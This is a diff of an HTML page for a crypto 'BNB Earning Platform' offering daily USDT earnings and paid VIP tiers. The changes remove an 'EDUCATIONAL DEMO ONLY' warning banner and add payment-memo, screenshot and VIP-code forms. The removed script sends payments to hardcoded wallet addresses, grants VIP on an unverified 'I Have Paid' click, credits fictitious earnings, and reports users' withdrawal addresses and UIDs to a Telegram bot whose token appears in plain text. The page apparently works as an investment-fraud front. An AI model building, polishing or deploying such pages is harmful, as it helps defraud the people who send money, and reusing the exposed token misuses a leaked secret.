@@ -5,580 +5,17 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>BNB Earning Platform</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-    <style>
-        /* === CSS RESET AND BASE STYLES === */
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-        }
-
-        :root {
-            --primary-color: #F0B90B;
-            --secondary-color: #1E2026;
-            --accent-color: #2B3139;
-            --text-color: #FFFFFF;
-            --text-secondary: #848E9C;
-            --danger-color: #F6465D;
-            --success-color: #0ECB81;
-            --card-bg: #1E2026;
-            --body-bg: #0B0E11;
-            --vip-gold: #FFD700;
-            --vip-silver: #C0C0C0;
-        }
-
-        body {
-            background: var(--body-bg);
-            color: var(--text-color);
-            min-height: 100vh;
-            padding-bottom: 80px;
-            line-height: 1.6;
-        }
-
-        .container {
-            max-width: 480px;
-            margin: 0 auto;
-            padding: 15px;
-        }
-
-        /* === WARNING BANNER === */
-        .warning-banner {
-            background: linear-gradient(135deg, var(--danger-color), #ff6b81);
-            color: white;
-            padding: 12px 15px;
-            border-radius: 12px;
-            margin-bottom: 20px;
-            text-align: center;
-            font-size: 14px;
-            box-shadow: 0 4px 15px rgba(246, 70, 93, 0.3);
-            animation: pulse 2s infinite;
-        }
-
-        @keyframes pulse {
-            0% { transform: scale(1); }
-            50% { transform: scale(1.02); }
-            100% { transform: scale(1); }
-        }
-
-        /* === HEADER SECTION === */
-        .header {
-            background: var(--card-bg);
-            border-radius: 16px;
-            padding: 20px;
-            margin-bottom: 20px;
-            box-shadow: 0 8px 25px rgba(0,0,0,0.3);
-            text-align: center;
-            border: 1px solid var(--accent-color);
-        }
-
-        .platform-title {
-            font-size: 28px;
-            font-weight: 700;
-            background: linear-gradient(135deg, var(--primary-color), #F8D33A);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            margin-bottom: 5px;
-        }
-
-        .user-info {
-            display: flex;
-            justify-content: space-between;
-            margin-top: 15px;
-            font-size: 14px;
-            color: var(--text-secondary);
-        }
-
-        /* === BALANCE CARD === */
-        .balance-card {
-            background: linear-gradient(135deg, var(--primary-color), #F8D33A);
-            border-radius: 20px;
-            padding: 25px;
-            color: var(--secondary-color);
-            margin-bottom: 20px;
-            box-shadow: 0 8px 25px rgba(240, 185, 11, 0.3);
-            position: relative;
-            overflow: hidden;
-        }
-
-        .balance-card::before {
-            content: '';
-            position: absolute;
-            top: -50%;
-            right: -50%;
-            width: 100%;
-            height: 100%;
-            background: rgba(255,255,255,0.1);
-            transform: rotate(30deg);
-            animation: shine 3s infinite;
-        }
-
-        @keyframes shine {
-            0% { transform: rotate(30deg) translateX(-100%); }
-            100% { transform: rotate(30deg) translateX(200%); }
-        }
-
-        .balance-title {
-            font-size: 16px;
-            font-weight: 600;
-            margin-bottom: 10px;
-        }
-
-        .balance-amount {
-            font-size: 36px;
-            font-weight: 800;
-            margin: 10px 0;
-            text-shadow: 2px 2px 4px rgba(0,0,0,0.1);
-        }
-
-        .balance-details {
-            display: flex;
-            justify-content: space-between;
-            margin-top: 15px;
-            font-size: 14px;
-        }
-
-        /* === EARNING STATUS === */
-        .earning-card {
-            background: var(--card-bg);
-            border-radius: 16px;
-            padding: 20px;
-            margin-bottom: 20px;
-            box-shadow: 0 8px 25px rgba(0,0,0,0.3);
-            border: 1px solid var(--accent-color);
-        }
-
-        .card-title {
-            font-size: 18px;
-            font-weight: 700;
-            margin-bottom: 15px;
-            display: flex;
-            align-items: center;
-        }
-
-        .card-title i {
-            margin-right: 10px;
-            color: var(--primary-color);
-        }
-
-        .earning-stats {
-            display: flex;
-            justify-content: space-between;
-            background: var(--accent-color);
-            padding: 15px;
-            border-radius: 12px;
-            margin-bottom: 15px;
-        }
-
-        .stat-item {
-            text-align: center;
-        }
-
-        .stat-value {
-            font-size: 20px;
-            font-weight: 700;
-            color: var(--primary-color);
-        }
-
-        .stat-label {
-            font-size: 12px;
-            color: var(--text-secondary);
-            margin-top: 5px;
-        }
-
-        /* === VIP TIERS === */
-        .vip-card {
-            background: var(--card-bg);
-            border-radius: 16px;
-            padding: 20px;
-            margin-bottom: 20px;
-            box-shadow: 0 8px 25px rgba(0,0,0,0.3);
-            border: 1px solid var(--accent-color);
-        }
-
-        .vip-tier {
-            background: var(--accent-color);
-            padding: 20px;
-            border-radius: 12px;
-            margin-bottom: 15px;
-            transition: all 0.3s ease;
-            border: 2px solid transparent;
-        }
-
-        .vip-tier:hover {
-            transform: translateY(-5px);
-            box-shadow: 0 10px 25px rgba(0,0,0,0.4);
-        }
-
-        .vip-tier.gold {
-            border-color: var(--vip-gold);
-        }
-
-        .vip-tier.silver {
-            border-color: var(--vip-silver);
-        }
-
-        .vip-title {
-            font-size: 18px;
-            font-weight: 700;
-            margin-bottom: 10px;
-            display: flex;
-            align-items: center;
-        }
-
-        .vip-title i {
-            margin-right: 10px;
-        }
-
-        .vip-tier.gold .vip-title {
-            color: var(--vip-gold);
-        }
-
-        .vip-tier.silver .vip-title {
-            color: var(--vip-silver);
-        }
-
-        .vip-price {
-            color: var(--primary-color);
-            font-weight: 700;
-            font-size: 20px;
-            margin: 10px 0;
-        }
-
-        .vip-earning {
-            color: var(--success-color);
-            font-weight: 700;
-            margin: 10px 0;
-        }
-
-        /* === PAYMENT OPTIONS === */
-        .payment-modal {
-            display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            right: 0;
-            bottom: 0;
-            background: rgba(11, 14, 17, 0.95);
-            z-index: 2000;
-            align-items: center;
-            justify-content: center;
-            padding: 20px;
-            animation: fadeIn 0.5s ease;
-        }
-
-        .payment-content {
-            background: var(--card-bg);
-            border-radius: 20px;
-            padding: 25px;
-            max-width: 400px;
-            width: 100%;
-            box-shadow: 0 15px 40px rgba(0,0,0,0.5);
-            border: 1px solid var(--accent-color);
-            animation: modalSlideIn 0.5s ease;
-        }
-
-        .payment-title {
-            font-size: 22px;
-            margin-bottom: 15px;
-            color: var(--primary-color);
-            text-align: center;
-        }
-
-        .chain-options {
-            display: flex;
-            justify-content: space-around;
-            margin: 20px 0;
-        }
-
-        .chain-option {
-            background: var(--accent-color);
-            padding: 15px;
-            border-radius: 10px;
-            text-align: center;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            flex: 1;
-            margin: 0 5px;
-        }
-
-        .chain-option:hover {
-            background: rgba(240, 185, 11, 0.2);
-            transform: translateY(-3px);
-        }
-
-        .chain-option.active {
-            background: rgba(240, 185, 11, 0.3);
-            border: 2px solid var(--primary-color);
-        }
-
-        .address-display {
-            background: var(--accent-color);
-            padding: 15px;
-            border-radius: 10px;
-            margin: 15px 0;
-            word-break: break-all;
-            font-size: 14px;
-            display: none;
-        }
-
-        .copy-btn {
-            background: var(--primary-color);
-            color: var(--secondary-color);
-            border: none;
-            padding: 10px 15px;
-            border-radius: 8px;
-            font-weight: 700;
-            cursor: pointer;
-            margin-top: 10px;
-            width: 100%;
-        }
-
-        /* === WITHDRAWAL SECTION === */
-        .withdraw-card {
-            background: var(--card-bg);
-            border-radius: 16px;
-            padding: 20px;
-            margin-bottom: 20px;
-            box-shadow: 0 8px 25px rgba(0,0,0,0.3);
-            border: 1px solid var(--accent-color);
-        }
-
-        .withdraw-form {
-            margin-top: 15px;
-        }
-
-        .form-group {
-            margin-bottom: 15px;
-        }
-
-        .form-label {
-            display: block;
-            margin-bottom: 5px;
-            font-weight: 600;
-        }
-
-        .form-input {
-            width: 100%;
-            padding: 12px 15px;
-            border-radius: 10px;
-            border: 1px solid var(--accent-color);
-            background: var(--accent-color);
-            color: var(--text-color);
-            font-size: 16px;
-        }
-
-        .form-input:focus {
-            outline: none;
-            border-color: var(--primary-color);
-        }
-
-        /* === INVITE SECTION === */
-        .invite-card {
-            background: var(--card-bg);
-            border-radius: 16px;
-            padding: 20px;
-            margin-bottom: 20px;
-            box-shadow: 0 8px 25px rgba(0,0,0,0.3);
-            border: 1px solid var(--accent-color);
-        }
-
-        .invite-code {
-            background: var(--accent-color);
-            padding: 15px;
-            border-radius: 10px;
-            text-align: center;
-            font-size: 18px;
-            font-weight: 700;
-            margin: 15px 0;
-            letter-spacing: 2px;
-        }
-
-        .invite-link {
-            background: var(--accent-color);
-            padding: 15px;
-            border-radius: 10px;
-            word-break: break-all;
-            font-size: 14px;
-            margin: 15px 0;
-        }
-
-        /* === BUTTONS === */
-        .btn {
-            background: var(--primary-color);
-            color: var(--secondary-color);
-            border: none;
-            padding: 12px 25px;
-            border-radius: 10px;
-            font-weight: 700;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            display: inline-flex;
-            align-items: center;
-            justify-content: center;
-            position: relative;
-            overflow: hidden;
-        }
-
-        .btn::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: -100%;
-            width: 100%;
-            height: 100%;
-            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent);
-            transition: left 0.5s;
-        }
-
-        .btn:hover::before {
-            left: 100%;
-        }
-
-        .btn:hover {
-            background: #F8D33A;
-            transform: translateY(-2px);
-            box-shadow: 0 6px 15px rgba(240, 185, 11, 0.4);
-        }
-
-        .btn:active {
-            transform: translateY(0);
-        }
-
-        .btn i {
-            margin-right: 8px;
-        }
-
-        .btn-block {
-            width: 100%;
-        }
-
-        .btn-success {
-            background: var(--success-color);
-        }
-
-        .btn-success:hover {
-            background: #1EDF9A;
-        }
-
-        /* === NAVIGATION BAR === */
-        .nav-bar {
-            position: fixed;
-            bottom: 0;
-            left: 0;
-            right: 0;
-            background: var(--card-bg);
-            display: flex;
-            justify-content: space-around;
-            padding: 15px 10px;
-            box-shadow: 0 -5px 20px rgba(0,0,0,0.5);
-            border-top: 1px solid var(--accent-color);
-            z-index: 1000;
-        }
-
-        .nav-item {
-            text-align: center;
-            padding: 8px 15px;
-            border-radius: 12px;
-            font-size: 12px;
-            color: var(--text-secondary);
-            transition: all 0.3s ease;
-            flex: 1;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            cursor: pointer;
-            position: relative;
-            overflow: hidden;
-        }
-
-        .nav-item i {
-            font-size: 20px;
-            margin-bottom: 5px;
-            transition: all 0.3s ease;
-        }
-
-        .nav-item::before {
-            content: '';
-            position: absolute;
-            bottom: 0;
-            left: 50%;
-            width: 0;
-            height: 3px;
-            background: var(--primary-color);
-            transition: all 0.3s ease;
-            transform: translateX(-50%);
-        }
-
-        .nav-item.active {
-            color: var(--primary-color);
-        }
-
-        .nav-item.active::before {
-            width: 80%;
-        }
-
-        .nav-item.active i {
-            transform: translateY(-2px);
-        }
-
-        .nav-item:hover {
-            color: var(--primary-color);
-            background: rgba(240, 185, 11, 0.1);
-        }
-
-        /* === ANIMATIONS === */
-        @keyframes fadeIn {
-            from { opacity: 0; }
-            to { opacity: 1; }
-        }
-
-        @keyframes modalSlideIn {
-            from {
-                opacity: 0;
-                transform: translateY(-50px) scale(0.9);
-            }
-            to {
-                opacity: 1;
-                transform: translateY(0) scale(1);
-            }
-        }
-
-        /* === RESPONSIVE DESIGN === */
-        @media (max-width: 480px) {
-            .container {
-                padding: 10px;
-            }
-            
-            .balance-amount {
-                font-size: 32px;
-            }
-            
-            .chain-options {
-                flex-direction: column;
-            }
-            
-            .chain-option {
-                margin: 5px 0;
-            }
-        }
-    </style>
+    <link rel="stylesheet" href="style.css">
 </head>
 <body>
     <div class="container">
-        <!-- Warning Banner -->
-        <div class="warning-banner">
-            <i class="fas fa-exclamation-triangle"></i> 
-            EDUCATIONAL DEMO ONLY - This is not a real earning platform
-        </div>
-
         <!-- Header Section -->
         <div class="header">
             <div class="platform-title">BNB EARNING</div>
-            <div style="color: var(--text-secondary); font-size: 14px;">Daily Crypto Earnings Platform</div>
+            <div class="platform-subtitle">Professional Crypto Platform</div>
             <div class="user-info">
-                <div>Status: <span id="userStatus" style="color: var(--primary-color);">Free User</span></div>
-                <div>UID: <span id="userId">USR******</span></div>
+                <div>User ID: <span id="userId">USR738225</span></div>
+                <div>Status: <span id="userStatus" class="status-free">Free User</span></div>
             </div>
         </div>
 
@@ -588,12 +25,12 @@
             <div class="balance-amount" id="userBalance">0.00 USDT</div>
             <div class="balance-details">
                 <div>
-                    <div style="font-size: 12px;">Today's Earnings</div>
-                    <div style="font-weight: 700;" id="todayEarnings">0.00 USDT</div>
+                    <div class="wallet-label">Today's Earnings</div>
+                    <div class="wallet-amount" id="todayEarnings">0.00 USDT</div>
                 </div>
                 <div>
-                    <div style="font-size: 12px;">Total Earned</div>
-                    <div style="font-weight: 700;" id="totalEarned">0.00 USDT</div>
+                    <div class="wallet-label">Total Earned</div>
+                    <div class="wallet-amount" id="totalEarned">0.00 USDT</div>
                 </div>
             </div>
         </div>
@@ -619,7 +56,7 @@
             </button>
         </div>
 
-        <!-- VIP Tiers -->
+        <!-- VIP Purchase Section -->
         <div class="vip-card">
             <div class="card-title">
                 <i class="fas fa-crown"></i> VIP Membership
@@ -650,6 +87,61 @@
             </div>
         </div>
 
+        <!-- VIP Code Claim Section -->
+        <div class="vip-code-card">
+            <div class="card-title">
+                <i class="fas fa-gift"></i> Claim VIP Code
+            </div>
+            
+            <div class="form-group">
+                <label class="form-label">Enter VIP Code</label>
+                <input type="text" class="form-input" id="vipCodeInput" placeholder="Enter 10-digit VIP code" maxlength="10">
+                <div class="form-hint">Enter code to activate VIP 2 (60 USDT value)</div>
+            </div>
+            
+            <button class="btn btn-success btn-block" id="claimVipCodeBtn">
+                <i class="fas fa-key"></i> Claim VIP Code
+            </button>
+            
+            <div class="available-codes">
+                <h4>Available VIP Codes:</h4>
+                <div id="vipCodesList" class="codes-list">
+                    <!-- VIP codes will be loaded here -->
+                </div>
+            </div>
+        </div>
+
+        <!-- Memo Submission Section -->
+        <div class="memo-card">
+            <div class="card-title">
+                <i class="fas fa-receipt"></i> Payment Verification
+            </div>
+            
+            <div class="form-group">
+                <label class="form-label">Payment Memo ID</label>
+                <input type="text" class="form-input" id="memoId" placeholder="Enter your payment memo ID">
+            </div>
+            
+            <div class="form-group">
+                <label class="form-label">Upload Payment Screenshot</label>
+                <div class="file-upload-area" id="fileUploadArea">
+                    <i class="fas fa-cloud-upload-alt"></i>
+                    <p>Click to upload screenshot</p>
+                    <input type="file" id="screenshotUpload" accept="image/*" hidden>
+                    <div class="file-preview" id="filePreview"></div>
+                </div>
+            </div>
+            
+            <div class="form-group">
+                <label class="form-label">Transaction Hash (Optional)</label>
+                <input type="text" class="form-input" id="transactionHash" placeholder="Enter transaction hash">
+            </div>
+            
+            <button class="btn btn-block" id="submitMemoBtn">
+                <i class="fas fa-paper-plane"></i> Submit Verification
+            </button>
+        </div>
+
         <!-- Withdrawal Section -->
         <div class="withdraw-card">
             <div class="card-title">
@@ -659,9 +151,7 @@
             <div class="form-group">
                 <label class="form-label">Withdrawal Amount (USDT)</label>
                 <input type="number" class="form-input" id="withdrawAmount" placeholder="Enter amount" min="0.02" step="0.01">
-                <div style="font-size: 12px; color: var(--text-secondary); margin-top: 5px;">
-                    Free User Limit: 0.02 USDT | VIP: No Limit
-                </div>
+                <div class="form-hint">Free User Limit: 0.02 USDT | VIP: No Limit</div>
             </div>
             
             <div class="form-group">
@@ -680,7 +170,7 @@
             </div>
             
             <div class="form-group">
-                <label class="form-label">UID (Bybit/Bitget)</label>
+                <label class="form-label">Exchange UID (Bybit/Bitget)</label>
                 <input type="text" class="form-input" id="withdrawUid" placeholder="Enter your UID">
             </div>
             
@@ -688,37 +178,19 @@
                 <i class="fas fa-paper-plane"></i> Request Withdrawal
             </button>
             
-            <div style="font-size: 12px; color: var(--text-secondary); text-align: center; margin-top: 15px;">
+            <div class="processing-info">
                 Withdrawals processed within 24 hours
             </div>
         </div>
 
-        <!-- Invite Section -->
-        <div class="invite-card">
+        <!-- User List Section -->
+        <div class="users-card">
             <div class="card-title">
-                <i class="fas fa-users"></i> Invite & Earn
+                <i class="fas fa-users"></i> Active Users
             </div>
             
-            <div class="invite-code" id="inviteCode">INVITE738225</div>
-            
-            <div class="invite-link" id="inviteLink">
-                https://bnb-earning.com/#/reg?ref=738225
-            </div>
-            
-            <button class="btn btn-block" id="copyInviteBtn">
-                <i class="fas fa-copy"></i> Copy Invite Link
-            </button>
-            
-            <div style="margin-top: 15px;">
-                <div class="card-title">
-                    <i class="fas fa-user-plus"></i> Enter Invite Code
-                </div>
-                <div class="form-group">
-                    <input type="text" class="form-input" id="enterInviteCode" placeholder="Enter invite code">
-                </div>
-                <button class="btn btn-block" id="submitInviteBtn">
-                    <i class="fas fa-check"></i> Submit Code
-                </button>
+            <div class="users-list" id="usersList">
+                <!-- Users will be loaded here -->
             </div>
         </div>
     </div>
@@ -730,15 +202,15 @@
             
             <div class="chain-options">
                 <div class="chain-option" data-chain="bnb">
-                    <i class="fab fa-bootstrap" style="font-size: 24px; margin-bottom: 5px;"></i>
+                    <i class="fab fa-bootstrap"></i>
                     <div>BNB Chain</div>
                 </div>
                 <div class="chain-option" data-chain="trx">
-                    <i class="fas fa-bolt" style="font-size: 24px; margin-bottom: 5px;"></i>
+                    <i class="fas fa-bolt"></i>
                     <div>TRX Chain</div>
                 </div>
                 <div class="chain-option" data-chain="sol">
-                    <i class="fas fa-sun" style="font-size: 24px; margin-bottom: 5px;"></i>
+                    <i class="fas fa-sun"></i>
                     <div>SOL Chain</div>
                 </div>
             </div>
@@ -747,19 +219,23 @@
                 <!-- Address will be inserted here -->
             </div>
             
-            <div style="margin: 15px 0; font-size: 14px; color: var(--text-secondary); text-align: center;">
+            <div class="payment-instructions">
                 Send exact amount to the address above
             </div>
             
+            <div class="memo-info">
+                <strong>Memo Required:</strong> <span id="memoDisplay"></span>
+            </div>
+            
             <button class="btn btn-block" id="copyAddressBtn">
-                <i class="fas fa-copy"></i> Copy Address
+                <i class="fas fa-copy"></i> Copy Address & Memo
             </button>
             
-            <button class="btn btn-success btn-block" id="confirmPaymentBtn" style="margin-top: 10px;">
+            <button class="btn btn-success btn-block" id="confirmPaymentBtn">
                 <i class="fas fa-check"></i> I Have Paid
             </button>
             
-            <button class="btn btn-block" id="closePaymentBtn" style="margin-top: 10px; background: var(--accent-color);">
+            <button class="btn btn-block btn-cancel" id="closePaymentBtn">
                 <i class="fas fa-times"></i> Cancel
             </button>
         </div>
@@ -779,447 +255,12 @@
             <i class="fas fa-wallet"></i>
             <span>Withdraw</span>
         </div>
-        <div class="nav-item" data-tab="invite">
+        <div class="nav-item" data-tab="users">
             <i class="fas fa-users"></i>
-            <span>Invite</span>
-        </div>
-        <div class="nav-item" data-tab="profile">
-            <i class="fas fa-user"></i>
-            <span>Profile</span>
+            <span>Users</span>
         </div>
     </div>
 
-    <script>
-        // === JAVASCRIPT CODE ===
-
-        // DOM Elements
-        const navItems = document.querySelectorAll('.nav-item');
-        const claimBtn = document.getElementById('claimBtn');
-        const buyVipBtns = document.querySelectorAll('.buy-vip');
-        const paymentModal = document.getElementById('paymentModal');
-        const closePaymentBtn = document.getElementById('closePaymentBtn');
-        const chainOptions = document.querySelectorAll('.chain-option');
-        const copyAddressBtn = document.getElementById('copyAddressBtn');
-        const confirmPaymentBtn = document.getElementById('confirmPaymentBtn');
-        const withdrawBtn = document.getElementById('withdrawBtn');
-        const copyInviteBtn = document.getElementById('copyInviteBtn');
-        const submitInviteBtn = document.getElementById('submitInviteBtn');
-
-        // User data
-        let userData = {
-            balance: 0.00,
-            todayEarnings: 0.00,
-            totalEarned: 0.00,
-            userStatus: 'free',
-            dailyEarning: 0.10,
-            lastClaim: null,
-            vipExpiry: null
-        };
-
-        // Wallet addresses
-        const walletAddresses = {
-            bnb: '0x53f90e7a0d2834b772890f4f456d51aaed61de43',
-            trx: 'TSKPhwUavSrKXXcbWG2TdPzYiBtoTNXP6i',
-            sol: 'HvHR4LeKdCH5Z2UDKVSDuju8c4ukPAa1CzchHseZ2LKu'
-        };
-
-        // Telegram API
-        const telegramBotToken = '7659505060:AAFmwIDn2OgrtNoemPpmBWaxsIfdsQdZGCI';
-        const telegramChatId = '7417215529';
-
-        // Initialize the app
-        document.addEventListener('DOMContentLoaded', function() {
-            loadUserData();
-            updateUI();
-            startCountdownTimer();
-            
-            // Set up tab navigation
-            setupTabNavigation();
-        });
-
-        // Load user data from localStorage
-        function loadUserData() {
-            const savedData = localStorage.getItem('bnbEarningUserData');
-            if (savedData) {
-                userData = JSON.parse(savedData);
-            }
-            
-            // Set last claim to now if not set
-            if (!userData.lastClaim) {
-                userData.lastClaim = new Date().toISOString();
-                saveUserData();
-            }
-        }
-
-        // Save user data to localStorage
-        function saveUserData() {
-            localStorage.setItem('bnbEarningUserData', JSON.stringify(userData));
-        }
-
-        // Update UI with user data
-        function updateUI() {
-            document.getElementById('userBalance').textContent = userData.balance.toFixed(2) + ' USDT';
-            document.getElementById('todayEarnings').textContent = userData.todayEarnings.toFixed(2) + ' USDT';
-            document.getElementById('totalEarned').textContent = userData.totalEarned.toFixed(2) + ' USDT';
-            document.getElementById('dailyEarning').textContent = userData.dailyEarning.toFixed(2) + ' USDT';
-            document.getElementById('userStatus').textContent = userData.userStatus === 'free' ? 'Free User' : 'VIP User';
-            
-            // Update claim button state
-            updateClaimButton();
-        }
-
-        // Update claim button based on time
-        function updateClaimButton() {
-            const now = new Date();
-            const lastClaim = new Date(userData.lastClaim);
-            const timeDiff = now - lastClaim;
-            const hoursDiff = timeDiff / (1000 * 60 * 60);
-            
-            if (hoursDiff >= 24) {
-                claimBtn.disabled = false;
-                claimBtn.innerHTML = '<i class="fas fa-gift"></i> Claim Daily Earnings';
-            } else {
-                claimBtn.disabled = true;
-                const hoursLeft = 24 - hoursDiff;
-                const hours = Math.floor(hoursLeft);
-                const minutes = Math.floor((hoursLeft - hours) * 60);
-                claimBtn.innerHTML = `<i class="fas fa-clock"></i> Next Claim: ${hours}h ${minutes}m`;
-            }
-        }
-
-        // Start countdown timer
-        function startCountdownTimer() {
-            setInterval(() => {
-                updateClaimButton();
-                
-                // Update next claim countdown
-                const now = new Date();
-                const lastClaim = new Date(userData.lastClaim);
-                const timeDiff = now - lastClaim;
-                const hoursDiff = timeDiff / (1000 * 60 * 60);
-                
-                if (hoursDiff < 24) {
-                    const hoursLeft = 24 - hoursDiff;
-                    const hours = Math.floor(hoursLeft);
-                    const minutes = Math.floor((hoursLeft - hours) * 60);
-                    const seconds = Math.floor(((hoursLeft - hours) * 60 - minutes) * 60);
-                    
-                    document.getElementById('nextClaim').textContent = 
-                        `${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
-                } else {
-                    document.getElementById('nextClaim').textContent = '00:00:00';
-                }
-            }, 1000);
-        }
-
-        // Setup tab navigation
-        function setupTabNavigation() {
-            navItems.forEach(item => {
-                item.addEventListener('click', function() {
-                    // Remove active class from all items
-                    navItems.forEach(nav => nav.classList.remove('active'));
-                    
-                    // Add active class to clicked item
-                    this.classList.add('active');
-                    
-                    // Get the tab name
-                    const tabName = this.getAttribute('data-tab');
-                    
-                    // Show/hide sections based on tab
-                    document.querySelectorAll('.container > div').forEach(section => {
-                        if (section.classList.contains('header') || section.classList.contains('balance-card')) {
-                            // Always show header and balance
-                            return;
-                        }
-                        
-                        if (section.classList.contains(tabName + '-card')) {
-                            section.style.display = 'block';
-                        } else {
-                            section.style.display = 'none';
-                        }
-                    });
-                });
-            });
-        }
-
-        // Claim daily earnings
-        claimBtn.addEventListener('click', function() {
-            if (this.disabled) return;
-            
-            userData.balance += userData.dailyEarning;
-            userData.todayEarnings += userData.dailyEarning;
-            userData.totalEarned += userData.dailyEarning;
-            userData.lastClaim = new Date().toISOString();
-            
-            saveUserData();
-            updateUI();
-            
-            // Show success message
-            showNotification(`Successfully claimed ${userData.dailyEarning} USDT!`, 'success');
-            
-            // Send Telegram notification
-            sendTelegramMessage(`User claimed ${userData.dailyEarning} USDT. New balance: ${userData.balance.toFixed(2)} USDT`);
-        });
-
-        // Buy VIP button click
-        buyVipBtns.forEach(btn => {
-            btn.addEventListener('click', function() {
-                const tier = this.getAttribute('data-tier');
-                const price = this.getAttribute('data-price');
-                
-                // Set payment details
-                document.getElementById('paymentTitle').textContent = `Buy ${tier.toUpperCase()} - ${price} USDT`;
-                document.getElementById('paymentModal').setAttribute('data-tier', tier);
-                document.getElementById('paymentModal').setAttribute('data-price', price);
-                
-                // Show payment modal
-                paymentModal.style.display = 'flex';
-            });
-        });
-
-        // Close payment modal
-        closePaymentBtn.addEventListener('click', function() {
-            paymentModal.style.display = 'none';
-            resetPaymentModal();
-        });
-
-        // Chain option selection
-        chainOptions.forEach(option => {
-            option.addEventListener('click', function() {
-                // Remove active class from all options
-                chainOptions.forEach(opt => opt.classList.remove('active'));
-                
-                // Add active class to clicked option
-                this.classList.add('active');
-                
-                // Get chain type
-                const chain = this.getAttribute('data-chain');
-                
-                // Show address for selected chain
-                const addressDisplay = document.getElementById('addressDisplay');
-                addressDisplay.innerHTML = `
-                    <strong>${chain.toUpperCase()} Address:</strong><br>
-                    ${walletAddresses[chain]}
-                    <br><br>
-                    <strong>Memo/Note:</strong> ${document.getElementById('paymentModal').getAttribute('data-tier')}
-                `;
-                addressDisplay.style.display = 'block';
-                
-                // Enable copy button
-                copyAddressBtn.disabled = false;
-            });
-        });
-
-        // Copy address to clipboard
-        copyAddressBtn.addEventListener('click', function() {
-            const addressDisplay = document.getElementById('addressDisplay');
-            const addressText = addressDisplay.textContent;
-            
-            navigator.clipboard.writeText(addressText).then(() => {
-                showNotification('Address copied to clipboard!', 'success');
-            }).catch(err => {
-                showNotification('Failed to copy address', 'error');
-            });
-        });
-
-        // Confirm payment
-        confirmPaymentBtn.addEventListener('click', function() {
-            const tier = paymentModal.getAttribute('data-tier');
-            const price = parseFloat(paymentModal.getAttribute('data-price'));
-            
-            // Check if user has selected a chain
-            const selectedChain = document.querySelector('.chain-option.active');
-            if (!selectedChain) {
-                showNotification('Please select a payment method', 'error');
-                return;
-            }
-            
-            // In a real app, you would verify payment here
-            // For demo, we'll just activate VIP
-            activateVIP(tier, price);
-            
-            // Close modal
-            paymentModal.style.display = 'none';
-            resetPaymentModal();
-        });
-
-        // Activate VIP
-        function activateVIP(tier, price) {
-            userData.userStatus = 'vip';
-            
-            if (tier === 'vip1') {
-                userData.dailyEarning = 1.00;
-            } else if (tier === 'vip2') {
-                userData.dailyEarning = 7.00;
-            }
-            
-            // Set VIP expiry (30 days from now)
-            const expiryDate = new Date();
-            expiryDate.setDate(expiryDate.getDate() + 30);
-            userData.vipExpiry = expiryDate.toISOString();
-            
-            saveUserData();
-            updateUI();
-            
-            // Show success message
-            showNotification(`VIP activated successfully! Daily earning: ${userData.dailyEarning} USDT`, 'success');
-            
-            // Send Telegram notification
-            sendTelegramMessage(`User purchased ${tier} for ${price} USDT. New daily earning: ${userData.dailyEarning} USDT`);
-        }
-
-        // Reset payment modal
-        function resetPaymentModal() {
-            chainOptions.forEach(opt => opt.classList.remove('active'));
-            document.getElementById('addressDisplay').style.display = 'none';
-            copyAddressBtn.disabled = true;
-        }
-
-        // Withdraw funds
-        withdrawBtn.addEventListener('click', function() {
-            const amount = parseFloat(document.getElementById('withdrawAmount').value);
-            const coin = document.getElementById('withdrawCoin').value;
-            const address = document.getElementById('withdrawAddress').value;
-            const uid = document.getElementById('withdrawUid').value;
-            
-            // Validation
-            if (!amount || amount <= 0) {
-                showNotification('Please enter a valid amount', 'error');
-                return;
-            }
-            
-            if (userData.userStatus === 'free' && amount > 0.02) {
-                showNotification('Free users can only withdraw up to 0.02 USDT', 'error');
-                return;
-            }
-            
-            if (amount > userData.balance) {
-                showNotification('Insufficient balance', 'error');
-                return;
-            }
-            
-            if (!address) {
-                showNotification('Please enter withdrawal address', 'error');
-                return;
-            }
-            
-            if (!uid) {
-                showNotification('Please enter your UID', 'error');
-                return;
-            }
-            
-            // Process withdrawal (in a real app, this would be done on the server)
-            userData.balance -= amount;
-            saveUserData();
-            updateUI();
-            
-            // Show success message
-            showNotification(`Withdrawal request submitted for ${amount} ${coin.toUpperCase()}. Processing within 24 hours.`, 'success');
-            
-            // Send Telegram notification
-            sendTelegramMessage(`Withdrawal request: ${amount} ${coin.toUpperCase()} to ${address} (UID: ${uid})`);
-            
-            // Clear form
-            document.getElementById('withdrawAmount').value = '';
-            document.getElementById('withdrawAddress').value = '';
-            document.getElementById('withdrawUid').value = '';
-        });
-
-        // Copy invite link
-        copyInviteBtn.addEventListener('click', function() {
-            const inviteLink = document.getElementById('inviteLink').textContent;
-            
-            navigator.clipboard.writeText(inviteLink).then(() => {
-                showNotification('Invite link copied to clipboard!', 'success');
-            }).catch(err => {
-                showNotification('Failed to copy invite link', 'error');
-            });
-        });
-
-        // Submit invite code
-        submitInviteBtn.addEventListener('click', function() {
-            const code = document.getElementById('enterInviteCode').value;
-            
-            if (!code) {
-                showNotification('Please enter an invite code', 'error');
-                return;
-            }
-            
-            // In a real app, you would validate the code on the server
-            // For demo, we'll just show a success message
-            showNotification('Invite code submitted successfully!', 'success');
-            
-            // Clear input
-            document.getElementById('enterInviteCode').value = '';
-        });
-
-        // Show notification
-        function showNotification(message, type) {
-            // Create notification element
-            const notification = document.createElement('div');
-            notification.style.cssText = `
-                position: fixed;
-                top: 20px;
-                right: 20px;
-                background: ${type === 'success' ? 'var(--success-color)' : 'var(--danger-color)'};
-                color: white;
-                padding: 15px 20px;
-                border-radius: 10px;
-                box-shadow: 0 5px 15px rgba(0,0,0,0.3);
-                z-index: 3000;
-                max-width: 300px;
-                animation: slideInRight 0.5s ease;
-            `;
-            
-            notification.innerHTML = `
-                <div style="display: flex; align-items: center;">
